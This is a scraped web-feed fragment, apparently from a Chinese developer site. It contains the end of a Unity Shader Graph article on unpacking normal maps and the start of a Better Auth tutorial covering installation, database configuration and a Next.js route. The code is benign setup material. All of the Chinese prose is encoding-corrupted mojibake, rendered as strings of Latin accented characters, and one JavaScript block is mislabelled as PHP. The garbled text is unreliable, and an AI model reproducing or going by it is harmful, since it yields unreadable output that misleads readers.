<p>è¯¥èŠ‚ç‚¹æä¾›ä¸¤ä¸ªå…³é”®æ§åˆ¶å‚æ•°ï¼š</p>
<ul>
<li><strong>Spaceï¼ˆç©ºé—´æ¨¡å¼ï¼‰</strong>ï¼šå†³å®šè¾“å‡ºæ³•çº¿çš„åæ ‡ç©ºé—´
<ul>
<li><strong>Tangentï¼ˆåˆ‡çº¿ç©ºé—´ï¼‰</strong>ï¼šé€‚ç”¨äºæ ‡å‡†æ³•çº¿è´´å›¾ï¼Œä½¿ç”¨UnpackNormalmapRGorAGå‡½æ•°å¤„ç†RGé€šé“æ•°æ®</li>
<li><strong>Objectï¼ˆå¯¹è±¡ç©ºé—´ï¼‰</strong>ï¼šé€‚ç”¨äºå¯¹è±¡ç©ºé—´æ³•çº¿è´´å›¾ï¼Œä½¿ç”¨UnpackNormalmapRGBå‡½æ•°å¤„ç†RGBé€šé“æ•°æ®</li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">æŠ€æœ¯å®ç°åŸç†</h2>
<h3 data-id="heading-6">æ³•çº¿æ•°æ®å­˜å‚¨æœºåˆ¶</h3>
<p>æ³•çº¿è´´å›¾é€šå¸¸é‡‡ç”¨å‹ç¼©å­˜å‚¨æ–¹å¼ä»¥èŠ‚çœçº¹ç†å†…å­˜ï¼š</p>
<ul>
<li><strong>RGå­˜å‚¨</strong>ï¼šä»…ä½¿ç”¨çº¢è‰²å’Œç»¿è‰²é€šé“å­˜å‚¨æ³•çº¿çš„XYåˆ†é‡ï¼ŒZåˆ†é‡é€šè¿‡å…¬å¼è®¡ç®—å¾—å‡º</li>
<li><strong>RGBå­˜å‚¨</strong>ï¼šä½¿ç”¨å…¨é€šé“å­˜å‚¨æ³•çº¿å‘é‡ï¼Œé€‚ç”¨äºå¯¹è±¡ç©ºé—´æ³•çº¿è´´å›¾</li>
</ul>
<h3 data-id="heading-7">ç©ºé—´è½¬æ¢é€»è¾‘</h3>
<p>èŠ‚ç‚¹æ ¹æ®Spaceå‚æ•°æ‰§è¡Œä¸åŒçš„ç©ºé—´è½¬æ¢ï¼š</p>
<ul>
<li><strong>åˆ‡çº¿ç©ºé—´æ¨¡å¼</strong>ï¼šå°†å‹ç¼©çš„RGæ•°æ®è½¬æ¢ä¸ºåˆ‡çº¿ç©ºé—´ä¸‹çš„æ³•çº¿å‘é‡ï¼Œå…¶Zåˆ†é‡é€šè¿‡å…¬å¼è®¡ç®—ï¼š<code>Z = sqrt(1 - XÂ² - YÂ²)</code></li>
<li><strong>å¯¹è±¡ç©ºé—´æ¨¡å¼</strong>ï¼šç›´æ¥å¤„ç†RGBé€šé“æ•°æ®ï¼Œé€šè¿‡UnpackNormalmapRGBå‡½æ•°å°†å‹ç¼©çš„RGBå€¼è½¬æ¢ä¸ºå¯¹è±¡ç©ºé—´æ³•çº¿å‘é‡</li>
</ul>
<h2 data-id="heading-8">å…¸å‹åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-9">æ³•çº¿è´´å›¾ç±»å‹é”™è¯¯è¡¥æ•‘</h3>
<p>å½“è¯¯å°†æ³•çº¿è´´å›¾è®¾ä¸ºDefaultç±»å‹æ—¶ï¼Œè¯¥èŠ‚ç‚¹å¯é€šè¿‡æ‰‹åŠ¨è§£å‹æ¢å¤æ³•çº¿æ•°æ®ï¼š</p>
<ol>
<li>ä½¿ç”¨Sample Texture 2DèŠ‚ç‚¹é‡‡æ ·æ³•çº¿è´´å›¾</li>
<li>å°†é‡‡æ ·ç»“æœè¿æ¥è‡³Normal UnpackèŠ‚ç‚¹çš„è¾“å…¥ç«¯å£</li>
<li>æ ¹æ®è´´å›¾ç±»å‹é€‰æ‹©Tangentæˆ–Objectç©ºé—´æ¨¡å¼</li>
</ol>
<h3 data-id="heading-10">å¤šé€šé“çº¹ç†å¤ç”¨</h3>
<p>åœ¨éœ€è¦åŒæ—¶ä½¿ç”¨æ³•çº¿è´´å›¾å’Œå…¶ä»–çº¹ç†çš„åœºæ™¯ä¸­ï¼š</p>
<ul>
<li>é€šè¿‡Channel SplitèŠ‚ç‚¹åˆ†ç¦»æ³•çº¿è´´å›¾çš„RGé€šé“</li>
<li>å°†åˆ†ç¦»åçš„é€šé“è¿æ¥è‡³Normal UnpackèŠ‚ç‚¹</li>
<li>ä¸ä¸»çº¹ç†è¿›è¡Œæ··åˆå¤„ç†</li>
</ul>
<h3 data-id="heading-11">è·¨å¹³å°å…¼å®¹å¤„ç†</h3>
<p>é’ˆå¯¹ä¸åŒå¹³å°çš„æ³•çº¿è´´å›¾å·®å¼‚ï¼š</p>
<ul>
<li>å¯¹ç§»åŠ¨ç«¯å¹³å°ä½¿ç”¨RGå­˜å‚¨æ¨¡å¼</li>
<li>å¯¹PCç«¯å¹³å°ä½¿ç”¨RGBå­˜å‚¨æ¨¡å¼</li>
<li>é€šè¿‡æ¡ä»¶åˆ¤æ–­èŠ‚ç‚¹é€‰æ‹©å¯¹åº”çš„è§£å‹æ–¹å¼</li>
</ul>
<h2 data-id="heading-12">æœ€ä½³å®è·µå»ºè®®</h2>
<ol>
<li><strong>ä¼˜å…ˆä½¿ç”¨å†…ç½®é‡‡æ ·</strong>ï¼šåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œç›´æ¥ä½¿ç”¨Sample Texture 2DèŠ‚ç‚¹å¹¶è®¾ç½®Typeä¸ºNormalæ›´ä¸ºé«˜æ•ˆ</li>
<li><strong>ç©ºé—´æ¨¡å¼é€‰æ‹©</strong>ï¼šåˆ‡çº¿ç©ºé—´æ¨¡å¼é€‚ç”¨äºæ ‡å‡†æ³•çº¿è´´å›¾ï¼Œå¯¹è±¡ç©ºé—´æ¨¡å¼é€‚ç”¨äºé¢„è®¡ç®—çš„å¯¹è±¡ç©ºé—´æ³•çº¿</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šé¿å…åœ¨ç‰‡æ®µç€è‰²å™¨ä¸­å¤šæ¬¡ä½¿ç”¨è¯¥èŠ‚ç‚¹ï¼Œå¯è€ƒè™‘åœ¨é¡¶ç‚¹ç€è‰²å™¨ä¸­é¢„è®¡ç®—éƒ¨åˆ†ç»“æœ</li>
<li><strong>è°ƒè¯•æŠ€å·§</strong>ï¼šé€šè¿‡å°†è¾“å‡ºæ³•çº¿è¿æ¥è‡³ColorèŠ‚ç‚¹ï¼Œå¯è§†åŒ–æ³•çº¿æ–¹å‘ä»¥éªŒè¯è§£å‹æ•ˆæœ</li>
</ol>
<h2 data-id="heading-13">ä»£ç ç”Ÿæˆç¤ºä¾‹</h2>
<h3 data-id="heading-14">åˆ‡çº¿ç©ºé—´æ¨¡å¼</h3>
<p><code>void Unity_NormalUnpack_float(float4 In, out float3 Out) {     Out = UnpackNormalmapRGorAG(In); }</code></p>
<p>è¯¥å‡½æ•°å°†RGé€šé“æ•°æ®è½¬æ¢ä¸ºåˆ‡çº¿ç©ºé—´æ³•çº¿å‘é‡ï¼ŒZåˆ†é‡é€šè¿‡è®¡ç®—å¾—å‡ºã€‚</p>
<h3 data-id="heading-15">å¯¹è±¡ç©ºé—´æ¨¡å¼</h3>
<p><code>void Unity_NormalUnpackRGB_float(float4 In, out float3 Out) {     Out = UnpackNormalmapRGB(In); }</code></p>
<p>è¯¥å‡½æ•°ç›´æ¥å¤„ç†RGBé€šé“æ•°æ®ï¼Œå°†å…¶è½¬æ¢ä¸ºå¯¹è±¡ç©ºé—´æ³•çº¿å‘é‡ã€‚</p>
<h2 data-id="heading-16">å¸¸è§é—®é¢˜è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-17">æ³•çº¿è´´å›¾æ˜¾ç¤ºå¼‚å¸¸</h3>
<ul>
<li><strong>æ£€æŸ¥è´´å›¾ç±»å‹</strong>ï¼šç¡®ä¿çº¹ç†å¯¼å…¥è®¾ç½®ä¸­æ­£ç¡®æ ‡è®°ä¸ºNormal Map</li>
<li><strong>éªŒè¯ç©ºé—´æ¨¡å¼</strong>ï¼šæ ¹æ®è´´å›¾ç±»å‹é€‰æ‹©æ­£ç¡®çš„Spaceå‚æ•°</li>
<li><strong>æ£€æŸ¥é€šé“é¡ºåº</strong>ï¼šç¡®è®¤è´´å›¾çš„RGBé€šé“é¡ºåºä¸é¢„æœŸä¸€è‡´</li>
</ul>
<h3 data-id="heading-18">æ€§èƒ½é—®é¢˜</h3>
<ul>
<li><strong>å‡å°‘èŠ‚ç‚¹ä½¿ç”¨</strong>ï¼šåœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨å†…ç½®é‡‡æ ·ä»£æ›¿æ‰‹åŠ¨è§£å‹</li>
<li><strong>ä¼˜åŒ–è®¡ç®—</strong>ï¼šé¿å…åœ¨ç‰‡æ®µç€è‰²å™¨ä¸­é‡å¤è®¡ç®—ç›¸åŒæ•°æ®</li>
<li><strong>ä½¿ç”¨LOD</strong>ï¼šå¯¹è¿œè·ç¦»ç‰©ä½“ä½¿ç”¨ç®€åŒ–æ³•çº¿è´´å›¾</li>
</ul>
<h2 data-id="heading-19">é«˜çº§åº”ç”¨æŠ€å·§</h2>
<h3 data-id="heading-20">è‡ªå®šä¹‰çº¹ç†é‡‡æ ·æµç¨‹</h3>
<p>é€šè¿‡ç»„åˆä½¿ç”¨Normal UnpackèŠ‚ç‚¹å’Œå…¶ä»–èŠ‚ç‚¹ï¼Œå¯ä»¥å®ç°æ›´å¤æ‚çš„æ³•çº¿å¤„ç†ï¼š</p>
<ol>
<li>ä½¿ç”¨Sample Texture 2DèŠ‚ç‚¹é‡‡æ ·æ³•çº¿è´´å›¾</li>
<li>é€šè¿‡Normal UnpackèŠ‚ç‚¹è§£å‹æ³•çº¿å‘é‡</li>
<li>ä½¿ç”¨Normal BlendèŠ‚ç‚¹æ··åˆå¤šä¸ªæ³•çº¿è´´å›¾</li>
<li>æœ€ç»ˆå°†å¤„ç†åçš„æ³•çº¿åº”ç”¨äºå…‰ç…§è®¡ç®—</li>
</ol>
<h3 data-id="heading-21">åŠ¨æ€æ³•çº¿ç”Ÿæˆ</h3>
<p>ç»“åˆHeight Mapå’ŒNormal From HeightèŠ‚ç‚¹ï¼Œå¯ä»¥å®æ—¶ç”Ÿæˆæ³•çº¿è´´å›¾ï¼š</p>
<ol>
<li>ä½¿ç”¨Sample Texture 2DèŠ‚ç‚¹é‡‡æ ·é«˜åº¦å›¾</li>
<li>é€šè¿‡Normal From HeightèŠ‚ç‚¹ç”Ÿæˆæ³•çº¿è´´å›¾</li>
<li>ä½¿ç”¨Normal UnpackèŠ‚ç‚¹å¤„ç†ç”Ÿæˆçš„æ³•çº¿</li>
<li>å°†ç»“æœåº”ç”¨äºè¡¨é¢å…‰ç…§è®¡ç®—</li>
</ol>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">ã€Unity Shader Graph ä½¿ç”¨ä¸ç‰¹æ•ˆå®ç°ã€‘</a><strong>ä¸“æ -ç›´è¾¾</strong>
ï¼ˆæ¬¢è¿<em>ç‚¹èµç•™è¨€</em>æ¢è®¨ï¼Œæ›´å¤šäººåŠ å…¥è¿›æ¥èƒ½æ›´åŠ å®Œå–„è¿™ä¸ªæ¢ç´¢çš„è¿‡ç¨‹ï¼ŒğŸ™ï¼‰</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025å¹´å…¨çƒæœ€å—æ¬¢è¿çš„JSé‰´æƒæ¡†æ¶Better Authï¼Œ3åˆ†é’Ÿå¸¦ä½ å­¦ä¼š]]></title>    <link>https://juejin.cn/post/7592432859863007266</link>    <guid>https://juejin.cn/post/7592432859863007266</guid>    <pubDate>2026-01-07T14:35:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859863007266" data-draft-id="7592276645362139136" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025å¹´å…¨çƒæœ€å—æ¬¢è¿çš„JSé‰´æƒæ¡†æ¶Better Authï¼Œ3åˆ†é’Ÿå¸¦ä½ å­¦ä¼š"/> <meta itemprop="keywords" content="å‰ç«¯,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-07T14:35:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ©™å­çš„AIç¬”è®°"/> <meta itemprop="url" content="https://juejin.cn/user/4010667128656254"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025å¹´å…¨çƒæœ€å—æ¬¢è¿çš„JSé‰´æƒæ¡†æ¶Better Authï¼Œ3åˆ†é’Ÿå¸¦ä½ å­¦ä¼š
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4010667128656254/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ©™å­çš„AIç¬”è®°
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T14:35:21.000Z" title="Wed Jan 07 2026 14:35:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4213d9e24124b0294748b42336f0451~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qmZ5a2Q55qEQUnnrJTorrA=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768403709&amp;x-signature=FhoN8F%2FKhw0na8D74mfDHcr5vD4%3D" alt="2025JSæ¦œå•.png" loading="lazy"/></p>
<p>2025å¹´ JavaScript 10å¤§æœ€å—æ¬¢è¿çš„å‰ç«¯é¡¹ç›®å·²ç»å…¬å¸ƒï¼Œ<strong>Better Auth</strong>ä½œä¸ºé‡Œé¢å”¯ä¸€çš„é‰´æƒæ¡†æ¶ï¼Œå—åˆ°äº†ç‰¹åˆ«æ¨èï¼Œå¦‚æœä½ è¿˜å¯¹å®ƒä¸å¤ªäº†è§£ï¼Œè¯·èŠ±3åˆ†é’Ÿæ—¶é—´ï¼Œæˆ‘å°†å¸¦ä½ å¿«é€Ÿä¸Šæ‰‹ã€‚</p>
<hr/>
<h2 data-id="heading-0">Better Auth æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>Better Auth æ˜¯ä¸€ä¸ªæ¡†æ¶æ— å…³çš„ã€é€šç”¨çš„èº«ä»½éªŒè¯å’Œæˆæƒæ¡†æ¶ï¼Œä¸“ä¸º TypeScript è®¾è®¡ã€‚å®ƒæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯<strong>åŠŸèƒ½å…¨é¢ï¼Œå¼€ç®±å³ç”¨</strong>ã€‚</p>
<h3 data-id="heading-1">æ ¸å¿ƒèƒ½åŠ›ä¸€è§ˆ</h3>













































<table><thead><tr><th>åŠŸèƒ½ç±»åˆ«</th><th>å…·ä½“èƒ½åŠ›</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>åŸºç¡€è®¤è¯</td><td>é‚®ç®±å¯†ç ç™»å½•</td><td>å†…ç½®å®‰å…¨çš„å¯†ç å“ˆå¸Œå’ŒéªŒè¯</td></tr><tr><td>ç¤¾äº¤ç™»å½•</td><td>OAuth æ”¯æŒ</td><td>GitHubã€Googleã€Discordã€Twitter ç­‰ä¸»æµå¹³å°</td></tr><tr><td>å®‰å…¨å¢å¼º</td><td>2FA åŒå› ç´ è®¤è¯</td><td>ä¸ºè´¦æˆ·æä¾›é¢å¤–å®‰å…¨å±‚ï¼ˆé‚®ç®±ã€æ‰‹æœºéªŒè¯ç ç­‰ï¼‰</td></tr><tr><td>ä¼šè¯ç®¡ç†</td><td>å¤šä¼šè¯æ”¯æŒ</td><td>æ”¯æŒç”¨æˆ·åŒæ—¶ç™»å½•å¤šä¸ªè®¾å¤‡</td></tr><tr><td>ä¼ä¸šåŠŸèƒ½</td><td>SaaS å¤šç§Ÿæˆ·æ”¯æŒ</td><td>ç»„ç»‡ã€å›¢é˜Ÿã€æˆå‘˜å’Œé‚€è¯·ç®¡ç†</td></tr><tr><td>é«˜çº§åŠŸèƒ½</td><td>SSO å•ç‚¹ç™»å½•</td><td>åˆ›å»ºè‡ªå·±çš„èº«ä»½æä¾›å•†</td></tr><tr><td>æ‰©å±•æ€§</td><td>æ’ä»¶ç”Ÿæ€</td><td>é€šè¿‡æ’ä»¶æ‰©å±•åŠŸèƒ½</td></tr></tbody></table>
<p>è¿™äº›åŠŸèƒ½ï¼ŒBetter Auth éƒ½å°è£…å¥½äº†ï¼Œåªéœ€è¦é…ç½®ä¸€ä¸‹å°±èƒ½ç”¨ã€‚</p>
<p>ç›¸æ¯”ä¼ ç»Ÿçš„è®¤è¯æ–¹æ¡ˆï¼ˆæ¯”å¦‚ NextAuth.jsï¼‰ï¼ŒBetter Auth æœ‰å‡ ä¸ªæ˜æ˜¾çš„ä¼˜åŠ¿ï¼š</p>
<ol start="0">
<li><strong>æ¡†æ¶æ— å…³</strong>ï¼šä¸ç»‘å®šç‰¹å®šæ¡†æ¶ï¼ŒReactã€Vueã€Svelteã€Next.jsã€Nuxt éƒ½èƒ½ç”¨</li>
<li><strong>TypeScript åŸç”Ÿ</strong>ï¼šå®Œæ•´çš„ç±»å‹æ”¯æŒï¼Œå¼€å‘ä½“éªŒæ›´å¥½</li>
<li><strong>æ’ä»¶åŒ–æ¶æ„</strong>ï¼šéœ€è¦ä»€ä¹ˆåŠŸèƒ½å°±åŠ ä»€ä¹ˆæ’ä»¶ï¼Œä¸ä¼šå¼•å…¥ä¸å¿…è¦çš„ä¾èµ–</li>
<li><strong>ç°ä»£åŒ–è®¾è®¡</strong>ï¼šé‡‡ç”¨æœ€æ–°çš„ Web æ ‡å‡†å’Œæœ€ä½³å®è·µ</li>
</ol>
<hr/>
<h2 data-id="heading-2">ä¸‹é¢ä»¥ Next.js + React å¸¦å¤§å®¶å¿«é€Ÿä¸Šæ‰‹ï¼ˆExpress+ Vue ä¹ŸåŸºæœ¬ä¸€æ ·ï¼‰</h2>
<p>ä¸‹é¢æˆ‘ä»¬ä»¥ Next.js å’Œ React ä¸ºä¾‹ï¼Œçœ‹çœ‹å¦‚ä½•å¿«é€Ÿé›†æˆ Better Authã€‚</p>
<h3 data-id="heading-3">ä¸€ã€å®‰è£…å’ŒåŸºç¡€é…ç½®</h3>
<p>é¦–å…ˆå®‰è£… Better Authï¼š</p>
<pre><code class="hljs">npm install better-auth
</code></pre>
<p>ç„¶ååˆ›å»ºç¯å¢ƒå˜é‡æ–‡ä»¶ <code>.env</code>ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">BETTER_AUTH_SECRET</span>=<span class="hljs-number">32</span>ä½ä»¥ä¸Šå¯†é’¥
<span class="hljs-attr">BETTER_AUTH_URL</span>=http://localhost:<span class="hljs-number">3000</span>
</code></pre>
<p>è¿™é‡Œ <code>BETTER_AUTH_SECRET</code> ç”¨äºåŠ å¯†å’Œå“ˆå¸Œï¼Œå¿…é¡»è‡³å°‘ 32 ä¸ªå­—ç¬¦ã€‚ä½ å¯ä»¥ç”¨ <code>openssl rand -base64 32</code> ç”Ÿæˆä¸€ä¸ªã€‚</p>
<h3 data-id="heading-4">äºŒã€åˆ›å»ºæœåŠ¡ç«¯è®¤è¯å®ä¾‹</h3>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•ï¼ˆæˆ– <code>lib/</code>ã€<code>utils/</code> æ–‡ä»¶å¤¹ï¼‰åˆ›å»º <code>auth.ts</code>ï¼š</p>
<pre><code class="hljs language-php" lang="php">import { betterAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">"better-auth"</span>;
import { Pool } <span class="hljs-keyword">from</span> <span class="hljs-string">"pg"</span>; <span class="hljs-comment">// ä»¥ PostgreSQL ä¸ºä¾‹</span>
â€‹
export <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">auth</span> = <span class="hljs-title function_ invoke__">betterAuth</span>({
 <span class="hljs-attr">Â database</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pool</span>({
 Â  <span class="hljs-attr">Â host</span>: process.env.DB_HOST,
 Â  <span class="hljs-attr">Â port</span>: <span class="hljs-number">5432</span>,
 Â  <span class="hljs-attr">Â user</span>: process.env.DB_USER,
 Â  <span class="hljs-attr">Â password</span>: process.env.DB_PASSWORD,
 Â  <span class="hljs-attr">Â database</span>: process.env.DB_NAME,
  }),
});
</code></pre>
<p>å¦‚æœä½ ç”¨çš„æ˜¯ SQLite æˆ–è€…æƒ³ç”¨ ORMï¼ˆæ¯”å¦‚ Drizzleã€Prismaï¼‰ï¼ŒBetter Auth ä¹Ÿæä¾›äº†å¯¹åº”çš„é€‚é…å™¨ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä½¿ç”¨ Drizzle</span>
<span class="hljs-keyword">import</span> { drizzleAdapter } <span class="hljs-keyword">from</span> <span class="hljs-string">"better-auth/adapters/drizzle"</span>;
<span class="hljs-keyword">import</span> { db } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/db"</span>;
â€‹
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> auth = <span class="hljs-title function_">betterAuth</span>({
 Â <span class="hljs-attr">database</span>: <span class="hljs-title function_">drizzleAdapter</span>(db, {
 Â  Â <span class="hljs-attr">provider</span>: <span class="hljs-string">"pg"</span>, <span class="hljs-comment">// æˆ– "mysql", "sqlite"</span>
  }),
});
</code></pre>
<h3 data-id="heading-5">ä¸‰ã€åˆ›å»ºæ•°æ®åº“è¡¨</h3>
<p>Better Auth æä¾›äº† CLI å·¥å…·æ¥ç®¡ç†æ•°æ®åº“ schemaï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”Ÿæˆè¿ç§»æ–‡ä»¶</span>
npx @better-auth/cli generate
â€‹
<span class="hljs-comment"># æˆ–è€…ç›´æ¥è¿ç§»ï¼ˆä»…æ”¯æŒ Kysely é€‚é…å™¨ï¼‰</span>
npx @better-auth/cli migrate
</code></pre>
<h3 data-id="heading-6">å››ã€åœ¨ Next.js ä¸­æŒ‚è½½ API è·¯ç”±</h3>
<p>åœ¨ Next.js App Router ä¸­ï¼Œåˆ›å»º <code>app/api/auth/[...all]/route.ts</code>ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { auth } <span class="hljs-keyword">from</span> <span class="hljs-string">"@/lib/auth"</span>;
<span class="hljs-keyword">import</span> { toNextJsHandler } <span class="hljs-keyword">from</span> <span class="hljs-string">"better-auth/next-js"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">GET</span>, <span class="hljs-variable constant_">POST</span> } = <span class="hljs-title function_">toNextJsHandler</span>(auth.<span class="hljs-property">handler</span>);
</code></pre>
<p>è¿™æ ·ç›¸å½“äºä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œæ‰€æœ‰ <code>/api/auth/*</code> çš„è¯·æ±‚éƒ½ä¼šè¢« Better Auth å¤„ç†ã€‚</p>
